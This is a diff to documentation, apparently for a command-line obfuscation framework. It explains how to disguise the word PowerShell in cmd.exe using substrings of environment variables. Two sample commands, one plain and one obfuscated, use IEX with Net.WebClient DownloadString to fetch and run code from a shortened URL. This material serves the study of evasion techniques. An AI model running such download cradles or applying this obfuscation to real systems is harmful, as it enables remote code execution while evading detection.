@@ -54,7 +54,7 @@ The framework provides 3 main obfuscation options:
 
 ### BINARY
 One way to obfuscate the string PowerShell in this example command:
-```powershell
+```CMD
 cmd.exe /c “powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
 is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.<br>
@@ -62,7 +62,7 @@ is to substitute individual characters with substrings of existing environment v
 The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.<br>
 ![binex 2](https://i.ibb.co/crTRJ94/image.png)<br>
 Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
-```powershell
+```CMD
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
 ![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
